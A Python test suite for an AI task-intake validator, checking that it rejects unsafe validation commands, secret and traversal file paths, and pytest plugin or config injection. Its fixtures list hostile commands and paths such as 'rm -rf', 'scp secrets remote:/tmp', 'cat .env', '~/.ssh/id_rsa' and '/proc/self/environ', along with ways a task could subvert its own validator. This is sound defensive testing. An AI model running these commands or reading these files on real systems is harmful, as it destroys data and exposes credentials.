    def test_auto_intake_blocks_everything_downstream_blocks(self):
        """No gap: AUTO-INTAKE already rejects the whole downstream denylist."""
        for cmd in self.DOWNSTREAM_BLOCKED:
            with self.subTest(cmd=cmd):
                self.assertTrue(DOWNSTREAM.DANGEROUS_VALIDATION.search(cmd))
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_no_conflict_downstream_never_rejects_what_intake_accepts(self):
        """No deadlock: a task accepted at intake cannot hard-block downstream."""
        for cmd in TestValidationCommandAllowlist.SAFE:
            with self.subTest(cmd=cmd):
                self.assertTrue(intake.validate_validation_command(cmd))
                self.assertIsNone(DOWNSTREAM.DANGEROUS_VALIDATION.search(cmd))

    def test_auto_intake_is_strictly_stricter_than_downstream(self):
        """Arbitrary shell the denylist would let through is stopped upstream."""
        slips_past_downstream = [
            "bash -lc curl.sh",
            "sh -c whoami",
            "python3 -c import os",
            "node -e process.exit(1)",
            "eval ls",
            "source .env",
            "cat .env",
            "pytest | tee /tmp/out",
            "pytest > /tmp/out",
            "echo $(cat .env)",
            "git rm -r scripts",
            "git config user.email a@b.c",
            "kubectl apply -f x.yaml",
            "terraform apply",
            "npm run deploy",
            "make deploy",
            "pip install requests",
            "scp secrets remote:/tmp",
            "wget https://example.com/x.sh",
        ]
        for cmd in slips_past_downstream:
            with self.subTest(cmd=cmd):
                self.assertIsNone(
                    DOWNSTREAM.DANGEROUS_VALIDATION.search(cmd),
                    "corpus must exercise the downstream GAP, not its denylist",
                )
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_task_file_handed_downstream_contains_no_arbitrary_shell(self):
        issue = make_issue(300, task=make_task(
            task_id="HANDOFF-1",
            validation_commands=[
                "python3 -m py_compile scripts/ai/auto_intake.py",
                "git status --porcelain",
                "git diff --check",
            ],
        ))
        intake.run_intake([issue], seen={}, head_resolver=head_ok)
        payload = json.loads(
            (intake.ROOT / ".ai-intake" / "tasks" / "HANDOFF-1.json").read_text(encoding="utf-8")
        )
        self.assertTrue(payload["validation_commands"])
        for cmd in payload["validation_commands"]:
            self.assertTrue(intake.validate_validation_command(cmd))
            self.assertIsNone(DOWNSTREAM.DANGEROUS_VALIDATION.search(cmd))
            for ch in intake.SHELL_META_CHARS:
                self.assertNotIn(ch, cmd)

    def test_unsafe_command_never_reaches_a_task_file(self):
        for bad in ["pytest && rm -rf .", "python3 -c import os", "curl https://x.example"]:
            with self.subTest(cmd=bad):
                issue = make_issue(301, task=make_task(
                    task_id="HANDOFF-BAD", validation_commands=[bad]
                ))
                summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
                self.assertEqual(summary["failed"], 1)
                self.assertFalse(
                    (intake.ROOT / ".ai-intake" / "tasks" / "HANDOFF-BAD.json").exists()
                )

    def test_downstream_denylist_left_intact(self):
        """Regression guard: downstream protection must not be weakened."""
        pattern = DOWNSTREAM.DANGEROUS_VALIDATION.pattern
        for token in ["rm\\s+-rf", "git\\s+reset\\s+--hard", "git\\s+clean",
                      "git\\s+push", "git\\s+commit", "wrangler\\s+deploy", "curl"]:
            with self.subTest(token=token):
                self.assertIn(token, pattern)


# --- CODEX BLOCKER 1: context_files path safety -----------------------------


class TestContextFileSafety(IntakeTestBase):
    UNSAFE = [
        "/proc/self/environ",
        "/etc/passwd",
        "../../etc/passwd",
        "../outside.txt",
        "scripts/../../etc/passwd",
        ".git/config",
        ".git/HEAD",
        "./.git/config",
        ".env",
        "./.env",
        "cloudflare-worker/.dev.vars",
        "~/.ssh/id_rsa",
        "scripts/**/*.py",
        "",
        "   ",
        ".",
        "..",
    ]

    def test_unsafe_context_files_rejected(self):
        for entry in self.UNSAFE:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_context_files([entry], 1)

    def test_unsafe_context_files_rejected_through_validate_task(self):
        for entry in ["/proc/self/environ", "../../etc/passwd", ".git/config",
                      ".env", "cloudflare-worker/.dev.vars"]:
            with self.subTest(entry=entry):
                task = make_task(context_files=[entry])
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(task, 1, head_resolver=head_ok)

    def test_hard_forbidden_files_rejected_even_when_they_exist(self):
        for entry in [".env", "cloudflare-worker/.dev.vars", ".git/config"]:
            with self.subTest(entry=entry):
                self.make_repo_file(entry, "SECRET=1\n")
                with self.assertRaises(intake.TaskError):
                    intake.validate_context_files([entry], 1)

    def test_symlink_escaping_root_rejected(self):
        link = intake.ROOT / "scripts" / "escape.py"
        link.parent.mkdir(parents=True, exist_ok=True)
        link.symlink_to("/etc/passwd")
        with self.assertRaises(intake.TaskError):
            intake.validate_context_files(["scripts/escape.py"], 1)

    def test_nonexistent_file_rejected(self):
        with self.assertRaises(intake.TaskError):
            intake.validate_context_files(["scripts/ai/does_not_exist.py"], 1)

    def test_directory_rejected(self):
        (intake.ROOT / "scripts" / "ai").mkdir(parents=True, exist_ok=True)
        with self.assertRaises(intake.TaskError):
            intake.validate_context_files(["scripts/ai"], 1)

    def test_non_string_entries_rejected(self):
        for entry in [1, None, True, ["a"], {"p": "a"}]:
            with self.subTest(entry=entry):
                with self.assertRaises(intake.TaskError):
                    intake.validate_context_files([entry], 1)

    def test_legitimate_repository_file_accepted(self):
        self.make_repo_file("docs/ai-coengineer/AUTO_INTAKE_V1.md", "# doc\n")
        intake.validate_context_files(
            ["scripts/ai/auto_intake.py", "docs/ai-coengineer/AUTO_INTAKE_V1.md"], 1
        )

    def test_unsafe_context_file_never_produces_a_task_file(self):
        issue = make_issue(400, task=make_task(
            task_id="CTX-BAD", context_files=["/proc/self/environ"]
        ))
        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
        self.assertEqual(summary["failed"], 1)
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "CTX-BAD.json").exists())


# --- CODEX BLOCKER 2: python validation trust boundary ----------------------


class TestPythonValidatorTrustBoundary(IntakeTestBase):
    def test_arbitrary_new_python_script_rejected(self):
        """A script the task itself could create is never a validator."""
        for cmd in [
            "python3 scripts/ai/evil.py",
            "python3 evil.py",
            "python3 scripts/ai/auto_intake.py",
            "python3 ./tools/anything.py",
            "python scripts/ai/evil.py",
        ]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_executing_modules_restricted_to_trusted_validators(self):
        for cmd in [
            "python3 -m pytest scripts/ai/evil_test.py",
            "python3 -m pytest scripts/ai/auto_intake.py",
            "python3 -m pytest docs/x.py",
            "pytest scripts/ai/auto_intake.py",
            "pytest scripts/tools",
            "python3 -m unittest scripts/ai/evil.py",
        ]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_only_exact_allowlisted_validators_accepted(self):
        """Directory trust is gone: membership is exact-match only."""
        self.assertTrue(intake.validate_validation_command(
            "python3 -m pytest scripts/ai/tests/test_auto_intake.py"
        ))
        for cmd in [
            "python3 -m pytest scripts/ai/tests",
            "pytest scripts/ai/tests",
            "python3 -m pytest scripts/ai/tests/test_new_thing.py",
            "pytest scripts/ai/tests/test_auto_intake.py extra/other.py",
        ]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_task_writable_validator_is_never_executed(self):
        """BLOCKER 2: a validator the task may rewrite is task-authored code."""
        trusted = sorted(intake.TRUSTED_PYTHON_VALIDATORS)[0]
        cmd = f"python3 -m pytest {trusted}"
        # Task cannot write the validator -> allowed.
        self.assertTrue(intake.validate_validation_command(
            cmd, ["cloudflare-worker/src/**"], []
        ))
        # Task CAN write the validator -> refused, even though it is allowlisted.
        for scope in [["scripts/ai/**"], ["scripts/ai/tests/**"], [trusted]]:
            with self.subTest(scope=scope):
                self.assertFalse(intake.validate_validation_command(cmd, scope, []))

    def test_task_authored_test_file_cannot_become_a_validator(self):
        """Living under scripts/ai/tests/ grants nothing on its own."""
        for cmd in [
            "python3 -m pytest scripts/ai/tests/test_task_authored.py",
            "pytest scripts/ai/tests/test_task_authored.py",
            "python3 -m unittest scripts/ai/tests/test_task_authored.py",
        ]:
            with self.subTest(cmd=cmd):
                self.assertFalse(
                    intake.validate_validation_command(cmd, ["scripts/ai/**"], [])
                )
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_validate_task_rejects_self_writable_validator(self):
        trusted = sorted(intake.TRUSTED_PYTHON_VALIDATORS)[0]
        task = make_task(
            allowed_paths=["scripts/ai/**"],
            validation_commands=[f"python3 -m pytest {trusted}"],
        )
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, head_resolver=head_ok)

    def test_non_executing_modules_may_target_repo_safe_paths(self):
        for cmd in [
            "python3 -m py_compile scripts/ai/auto_intake.py",
            "ruff check scripts/ai",
            "flake8 scripts/ai",
        ]:
            with self.subTest(cmd=cmd):
                self.assertTrue(intake.validate_validation_command(cmd))

    def test_non_executing_modules_still_repo_safe(self):
        for cmd in [
            "python3 -m py_compile /proc/self/environ",
            "python3 -m py_compile ../../etc/passwd",
            "python3 -m py_compile .git/config",
            "python3 -m py_compile .env",
            "ruff check cloudflare-worker/.dev.vars",
        ]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_task_declaring_untrusted_validator_is_rejected(self):
        issue = make_issue(401, task=make_task(
            task_id="VAL-BAD", validation_commands=["python3 scripts/ai/evil.py"]
        ))
        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
        self.assertEqual(summary["failed"], 1)
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "VAL-BAD.json").exists())

    # NOTE: the post-validation scope recheck is proven BEHAVIOURALLY against a
    # real git repository in test_downstream_scope.py, not by asserting that a
    # source string exists.


# --- CODEX BLOCKER 4: receipt claim race ------------------------------------


class FakeLabelServer:
    """Minimal durable-label server shared by two simulated intake runs."""

    def __init__(self, probe_blind: bool = False):
        self.labels: set[str] = set()
        self.probe_blind = probe_blind

    def __call__(self, method, url, body=None):
        if method == "POST" and url.endswith("/labels") and "/issues/" not in url:
            name = (body or {}).get("name", "")
            if name in self.labels:
                return 422
            self.labels.add(name)
            return 201
        if method == "GET":
            if self.probe_blind:
                return 404
            name = urllib.parse.unquote(url.rsplit("/", 1)[-1])
            return 200 if name in self.labels else 404
        return 200


class TestReceiptClaimRace(IntakeTestBase):
    def test_lost_race_becomes_duplicate_not_success(self):
        original_mark = intake.mark_processed
        marked: list[str] = []
        intake.mark_processed = lambda task, n: marked.append(task["task_id"])
        self.addCleanup(setattr, intake, "mark_processed", original_mark)

        self.claim_status = 422
        seen: dict[str, int] = {}
        summary = intake.run_intake(
            [make_issue(500, task=make_task(task_id="RACE-1"))],
            seen=seen, head_resolver=head_ok,
        )
        self.assertEqual(summary["processed"], 0)
        self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
        self.assertEqual(marked, [])
        self.assertNotIn("RACE-1", seen)

    def test_get_200_after_failed_claim_is_not_ownership(self):
        """A label that exists but that WE did not create grants nothing."""
        self.claim_status = 500
        self.label_status = 200
        with self.assertRaises(intake.TaskError):
            intake.create_receipt_label("RACE-2", 501)

    def test_only_the_creator_owns_the_claim(self):
        self.claim_status = 201
        intake.create_receipt_label("RACE-3", 502)  # 201 -> we own it
        self.claim_status = 422
        with self.assertRaises(intake.ReceiptRaceLost):
            intake.create_receipt_label("RACE-3", 503)

    def test_two_concurrent_runs_yield_exactly_one_ready(self):
        """Both runs observe the receipt absent, then race on the claim."""
        server = FakeLabelServer(probe_blind=True)
        self.label_status = lambda url: server("GET", url)
        self.claim_status = lambda url: 0  # unused; overridden below

        def status(method, url, body=None):
            self.status_calls.append((method, url))
            return server(method, url, body)

        intake.github_request_status = status

        issue = make_issue(510, task=make_task(task_id="RACE-CONCURRENT"))
        outcomes = []
        for _ in range(2):
            # Each "runner" has its own empty workspace and memo.
            fresh = tempfile.TemporaryDirectory()
            self.addCleanup(fresh.cleanup)
            intake.ROOT = pathlib.Path(fresh.name)
            self.make_repo_file("scripts/ai/auto_intake.py", "# fixture\n")
            summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
            outcomes.append(summary)

        statuses = [s["results"][0]["status"] for s in outcomes]
        self.assertEqual(statuses.count("READY"), 1)
        self.assertEqual(statuses.count("DUPLICATE_SKIPPED"), 1)
        self.assertEqual(sum(s["processed"] for s in outcomes), 1)
        self.assertEqual(sum(s["failed"] for s in outcomes), 0)


# --- CODEX BLOCKER 5: transport failures stay per-issue ---------------------


class TestTransportFailureContainment(IntakeTestBase):
    def test_receipt_systemexit_does_not_abort_batch(self):
        original = intake.post_receipt

        def exploding_receipt(n, task, f):
            if task["task_id"] == "TRANSPORT-1":
                raise SystemExit(2)
            return original(n, task, f)

        intake.post_receipt = exploding_receipt
        self.addCleanup(setattr, intake, "post_receipt", original)

        summary = intake.run_intake(
            [
                make_issue(600, task=make_task(task_id="TRANSPORT-1")),
                make_issue(601, task=make_task(task_id="TRANSPORT-OK")),
            ],
            seen={}, head_resolver=head_ok,
        )

        self.assertEqual(summary["total"], 2)
        self.assertEqual(summary["failed"], 1)
        self.assertEqual(summary["processed"], 1)
        self.assertEqual(summary["failures"][0]["issue_number"], 600)
        self.assertTrue(
            (intake.ROOT / ".ai-intake" / "tasks" / "TRANSPORT-OK.json").is_file()
        )

    def test_status_report_systemexit_is_contained(self):
        original = intake.report_status

        def exploding_status(n, status, detail=""):
            raise SystemExit(2)

        intake.report_status = exploding_status
        self.addCleanup(setattr, intake, "report_status", original)

        summary = intake.run_intake(
            [make_issue(602, task=make_task(task_id="TRANSPORT-2"))],
            seen={}, head_resolver=head_ok,
        )
        self.assertEqual(summary["total"], 1)
        self.assertEqual(summary["failed"], 1)

    def test_audit_comment_failure_does_not_fail_the_task(self):
        """The durable claim already succeeded; a lost audit comment is not
        allowed to turn a completed intake into a failure."""
        self.gh.responses["/comments"] = lambda method, url, body: None
        summary = intake.run_intake(
            [make_issue(603, task=make_task(task_id="TRANSPORT-3"))],
            seen={}, head_resolver=head_ok,
        )
        self.assertEqual(summary["processed"], 1)
        self.assertEqual(summary["failed"], 0)
        self.assertTrue(
            (intake.ROOT / ".ai-intake" / "tasks" / "TRANSPORT-3.json").is_file()
        )

    def test_later_valid_issues_survive_repeated_transport_failures(self):
        original = intake.post_receipt
        bad = {"BATCH-1", "BATCH-3"}

        def flaky(n, task, f):
            if task["task_id"] in bad:
                raise SystemExit(2)
            return original(n, task, f)

        intake.post_receipt = flaky
        self.addCleanup(setattr, intake, "post_receipt", original)

        issues = [
            make_issue(610 + i, task=make_task(task_id=f"BATCH-{i}"))
            for i in range(5)
        ]
        summary = intake.run_intake(issues, seen={}, head_resolver=head_ok)
        self.assertEqual(summary["total"], 5)
        self.assertEqual(summary["failed"], 2)
        self.assertEqual(summary["processed"], 3)


# --- CODEX BLOCKER 3: immutable validator dependency closure ----------------


class TestValidatorDependencyClosure(IntakeTestBase):
    """Allowlisting the validator FILE is not enough: everything it imports must
    also be outside the task's writable scope."""

    def setUp(self):
        super().setUp()
        self.validator = sorted(intake.TRUSTED_PYTHON_VALIDATORS)[0]
        self.cmd = f"python3 -m pytest {self.validator}"

    def test_closure_is_declared_for_every_trusted_validator(self):
        for validator in intake.TRUSTED_PYTHON_VALIDATORS:
            with self.subTest(validator=validator):
                closure = intake.validator_closure(validator)
                self.assertIn(validator, closure)
                self.assertGreaterEqual(len(closure), 1)

    def test_writing_any_dependency_blocks_execution(self):
        """The dependency attack: task writes an imported module, not the test."""
        for dependency in intake.validator_closure(self.validator):
            with self.subTest(dependency=dependency):
                self.assertFalse(
                    intake.validate_validation_command(self.cmd, [dependency], []),
                    f"task writable at {dependency} must not execute the validator",
                )

    def test_writing_a_parent_scope_of_a_dependency_blocks_execution(self):
        for scope in [["scripts/ai/**"], ["scripts/**"], ["scripts/ai/tests/**"]]:
            with self.subTest(scope=scope):
                self.assertFalse(intake.validate_validation_command(self.cmd, scope, []))

    def test_unrelated_scope_still_permits_the_validator(self):
        self.assertTrue(intake.validate_validation_command(
            self.cmd, ["cloudflare-worker/src/**"], []
        ))

    def test_forbidden_paths_can_re_enable_a_broad_scope(self):
        """Explicitly carving the closure out of a broad scope is sufficient."""
        allowed = ["scripts/ai/**"]
        forbidden = list(intake.validator_closure(self.validator))
        self.assertTrue(intake.validate_validation_command(self.cmd, allowed, forbidden))

    def test_dependency_attack_rejected_end_to_end(self):
        task = make_task(
            task_id="DEP-ATTACK",
            allowed_paths=["scripts/ai/auto_intake.py"],
            validation_commands=[self.cmd],
        )
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, head_resolver=head_ok)

        issue = make_issue(700, task=task)
        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
        self.assertEqual(summary["failed"], 1)
        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "DEP-ATTACK.json").exists())

    def test_declared_closure_matches_what_the_validator_actually_loads(self):
        """Drift guard: a new import must be added to VALIDATOR_DEPENDENCIES."""
        repo_root = MODULE_PATH.parent.parent.parent
        for validator, closure in intake.VALIDATOR_DEPENDENCIES.items():
            source_path = repo_root / validator
            if not source_path.is_file():
                continue
            # Only code lines that BUILD a module path from a parent directory
            # count as loading; a quoted path inside a fixture or comment does
            # not. Comments are stripped so this guard cannot match itself.
            loaded = set()
            for line in source_path.read_text(encoding="utf-8").splitlines():
                code = line.split("#", 1)[0]
                if not re.search(r"\bparents?\b", code):
                    continue
                loaded.update(re.findall(r'["\']([A-Za-z0-9_]+\.py)["\']', code))
            for module in loaded:
                candidates = [c for c in closure if c.endswith("/" + module)]
                with self.subTest(validator=validator, module=module):
                    self.assertTrue(
                        candidates,
                        f"{validator} loads {module} but it is not declared in "
                        f"VALIDATOR_DEPENDENCIES",
                    )

    def test_undeclared_validator_falls_back_to_itself_only(self):
        self.assertEqual(
            intake.validator_closure("scripts/ai/tests/test_unknown.py"),
            ("scripts/ai/tests/test_unknown.py",),
        )
        self.assertFalse(intake.validate_validation_command(
            "python3 -m pytest scripts/ai/tests/test_unknown.py",
            ["cloudflare-worker/src/**"], [],
        ))


# --- CODEX BLOCKER: executing validators must name one explicit target -------


class TestExplicitValidatorTargetRequired(IntakeTestBase):
    """A test runner with no explicit target auto-discovers executable tests
    from the task-writable worktree. Discovery is never permitted."""

    NO_TARGET = [
        "pytest",
        "pytest -v",
        "pytest -q",
        "pytest -x -v",
        "pytest --maxfail=1",
        "python3 -m pytest",
        "python -m pytest",
        "python3 -m pytest -v",
        "python3 -m unittest",
        "python -m unittest",
        "python3 -m unittest -v",
    ]
    DISCOVERY = [
        "python3 -m unittest discover",
        "python3 -m unittest discover -v",
        "python3 -m unittest discover -s scripts/ai/tests",
        "pytest --collect-only",
        "pytest --co",
        "pytest --pyargs scripts",
        "pytest --doctest-modules",
    ]
    MULTI_TARGET = [
        "pytest scripts/ai/tests/test_auto_intake.py scripts/ai/tests/test_other.py",
        "python3 -m pytest scripts/ai/tests/test_auto_intake.py extra/thing.py",
    ]

    def setUp(self):
        super().setUp()
        self.validator = sorted(intake.TRUSTED_PYTHON_VALIDATORS)[0]
        self.immutable_scope = ["cloudflare-worker/src/**"]

    def test_bare_pytest_rejected(self):
        for cmd in ["pytest", "python3 -m pytest", "python -m pytest"]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))
                self.assertFalse(intake.validate_validation_command(
                    cmd, self.immutable_scope, []))

    def test_pytest_with_flags_but_no_target_rejected(self):
        for cmd in ["pytest -v", "pytest -q", "pytest -x -v", "pytest --maxfail=1"]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(
                    cmd, self.immutable_scope, []))

    def test_bare_unittest_rejected(self):
        for cmd in ["python3 -m unittest", "python -m unittest", "python3 -m unittest -v"]:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(
                    cmd, self.immutable_scope, []))

    def test_unittest_discovery_rejected(self):
        for cmd in self.DISCOVERY:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(cmd))
                self.assertFalse(intake.validate_validation_command(
                    cmd, self.immutable_scope, []))

    def test_every_targetless_form_rejected(self):
        for cmd in self.NO_TARGET + self.DISCOVERY + self.MULTI_TARGET:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(
                    cmd, self.immutable_scope, []))

    def test_multiple_targets_rejected(self):
        for cmd in self.MULTI_TARGET:
            with self.subTest(cmd=cmd):
                self.assertFalse(intake.validate_validation_command(
                    cmd, self.immutable_scope, []))

    def test_exact_validator_accepted_only_when_closure_is_immutable(self):
        cmd = f"python3 -m pytest {self.validator}"
        self.assertTrue(intake.validate_validation_command(cmd, self.immutable_scope, []))
        for dependency in intake.validator_closure(self.validator):
            with self.subTest(writable=dependency):
                self.assertFalse(intake.validate_validation_command(cmd, [dependency], []))

    def test_task_writable_validator_rejected(self):
        cmd = f"pytest {self.validator}"
        self.assertTrue(intake.validate_validation_command(cmd, self.immutable_scope, []))
        for scope in [["scripts/ai/**"], ["scripts/ai/tests/**"], [self.validator]]:
            with self.subTest(scope=scope):
                self.assertFalse(intake.validate_validation_command(cmd, scope, []))

    def test_auto_loaded_conftest_is_part_of_the_closure(self):
        """A task able to plant a conftest.py could execute code at collection."""
        cmd = f"python3 -m pytest {self.validator}"
        for scope in [["scripts/ai/tests/conftest.py"], ["conftest.py"], ["pyproject.toml"]]:
            with self.subTest(scope=scope):
                self.assertFalse(intake.validate_validation_command(cmd, scope, []))

    def test_discovery_flags_rejected_even_with_a_valid_target(self):
        """`--doctest-modules` / `--pyargs` pull in modules beyond the named
        target, so they defeat the one-explicit-target rule."""
        for flag in ["--doctest-modules", "--pyargs", "--collect-only", "--co"]:
            cmd = f"pytest {self.validator} {flag}"
            with self.subTest(flag=flag):
                self.assertFalse(
                    intake.validate_validation_command(cmd, self.immutable_scope, []),
                    f"{flag} widens execution beyond the named validator",
                )
        # Control: the same command without the flag is accepted.
        self.assertTrue(intake.validate_validation_command(
            f"pytest {self.validator}", self.immutable_scope, []))

    def test_discover_keyword_rejected_even_with_a_valid_target(self):
        cmd = f"python3 -m unittest discover {self.validator}"
        self.assertFalse(intake.validate_validation_command(cmd, self.immutable_scope, []))

    def test_non_executing_validators_do_not_need_a_target_rule(self):
        for cmd in [
            "python3 -m py_compile scripts/ai/auto_intake.py",
            "ruff check scripts/ai",
            "git diff --check",
            "echo ok",
            "true",
        ]:
            with self.subTest(cmd=cmd):
                self.assertTrue(intake.validate_validation_command(cmd, ["scripts/ai/**"], []))

    def test_targetless_runner_rejected_end_to_end(self):
        for cmd in ["pytest", "pytest -v", "python3 -m unittest"]:
            with self.subTest(cmd=cmd):
                task = make_task(
                    task_id="NO-TARGET",
                    allowed_paths=["cloudflare-worker/src/**"],
                    validation_commands=[cmd],
                )
                with self.assertRaises(intake.TaskError):
                    intake.validate_task(task, 1, head_resolver=head_ok)
                issue = make_issue(800, task=task)
                summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
                self.assertEqual(summary["failed"], 1)
                self.assertFalse(
                    (intake.ROOT / ".ai-intake" / "tasks" / "NO-TARGET.json").exists()
                )


# --- CODEX BLOCKER: plugin/config injection into an executing runner --------


class TestRunnerOptionAllowlist(IntakeTestBase):
    """Plugin and configuration options execute task-authored Python BEFORE the
    allowlisted validator runs, so the runner accepts an explicit option
    allowlist only."""

    def setUp(self):
        super().setUp()
        self.validator = sorted(intake.TRUSTED_PYTHON_VALIDATORS)[0]
        self.scope = ["cloudflare-worker/src/**"]

    def _reject(self, cmd):
        self.assertFalse(
            intake.validate_validation_command(cmd, self.scope, []),
            f"must be rejected: {cmd}",
        )

    def test_plugin_option_rejected(self):
        for cmd in [
            f"pytest -p evil {self.validator}",
            f"pytest -p=evil {self.validator}",
            f"pytest {self.validator} -p evil",
            f"python3 -m pytest -p evil {self.validator}",
            f"pytest -p no:cacheprovider {self.validator}",
            f"pytest -P evil {self.validator}",
            f"pytest --plugins evil {self.validator}",
        ]:
            with self.subTest(cmd=cmd):
                self._reject(cmd)

    def test_config_injection_rejected(self):
        for cmd in [
            f"pytest -c evil.ini {self.validator}",
            f"pytest --config-file=evil.ini {self.validator}",
            f"pytest --rootdir=/tmp {self.validator}",
            f"pytest --rootdir /tmp {self.validator}",
            f"pytest --confcutdir=/tmp {self.validator}",
            f"pytest --import-mode=importlib {self.validator}",
            f"pytest --assert=plain {self.validator}",
            f"python3 -m pytest --rootdir=/tmp {self.validator}",
        ]:
            with self.subTest(cmd=cmd):
                self._reject(cmd)

    def test_collection_widening_options_rejected(self):
        for cmd in [
            f"pytest --doctest-modules {self.validator}",
            f"pytest --pyargs {self.validator}",
            f"pytest --collect-only {self.validator}",
            f"pytest -k evil {self.validator}",
            f"python3 -m unittest discover {self.validator}",
        ]:
            with self.subTest(cmd=cmd):
                self._reject(cmd)

    def test_unknown_option_rejected_by_default(self):
        """Fail-closed: a future pytest option is refused until allowlisted."""
        for cmd in [
            f"pytest --some-future-option {self.validator}",
            f"pytest --future=value {self.validator}",
            f"pytest -Z {self.validator}",
            f"pytest {self.validator} trailing_positional",
        ]:
            with self.subTest(cmd=cmd):
                self._reject(cmd)

    def test_ordinary_allowlisted_invocation_still_accepted(self):
        for cmd in [
            f"pytest {self.validator}",
            f"python3 -m pytest {self.validator}",
            f"pytest -v {self.validator}",
            f"pytest {self.validator} -v",
            f"pytest {self.validator} -q",
            f"pytest {self.validator} -x --tb=short",
            f"pytest {self.validator} --maxfail=1",
            f"python3 -m pytest {self.validator} -v",
        ]:
            with self.subTest(cmd=cmd):
                self.assertTrue(
                    intake.validate_validation_command(cmd, self.scope, []),
                    f"must remain accepted: {cmd}",
                )

    def test_permitted_options_are_a_closed_set(self):
        for option in intake.PERMITTED_RUNNER_OPTIONS:
            with self.subTest(option=option):
                self.assertTrue(intake.is_permitted_runner_option(option))
        for option in ["-p", "-P", "-c", "-s", "-k", "--rootdir", "--pyargs", "evil"]:
            with self.subTest(option=option):
                self.assertFalse(intake.is_permitted_runner_option(option))

    def test_bare_and_discovery_runners_remain_rejected(self):
        for cmd in [
            "pytest", "pytest -v", "pytest -q", "pytest -x",
            "python3 -m pytest", "python3 -m unittest",
            "python3 -m unittest discover",
            "python3 -m unittest discover -s scripts/ai/tests",
        ]:
            with self.subTest(cmd=cmd):
                self._reject(cmd)
                self.assertFalse(intake.validate_validation_command(cmd))

    def test_dependency_closure_still_enforced_with_options(self):
        cmd = f"pytest {self.validator} -v"
        self.assertTrue(intake.validate_validation_command(cmd, self.scope, []))
        for dependency in intake.validator_closure(self.validator):
            with self.subTest(writable=dependency):
                self.assertFalse(intake.validate_validation_command(cmd, [dependency], []))

    def test_plugin_injection_rejected_end_to_end(self):
        task = make_task(
            task_id="PLUGIN-INJECT",
            allowed_paths=["cloudflare-worker/src/**"],
            validation_commands=[f"pytest -p evil {self.validator}"],
        )
        with self.assertRaises(intake.TaskError):
            intake.validate_task(task, 1, head_resolver=head_ok)
        issue = make_issue(810, task=task)
        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
        self.assertEqual(summary["failed"], 1)
        self.assertFalse(
            (intake.ROOT / ".ai-intake" / "tasks" / "PLUGIN-INJECT.json").exists()
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
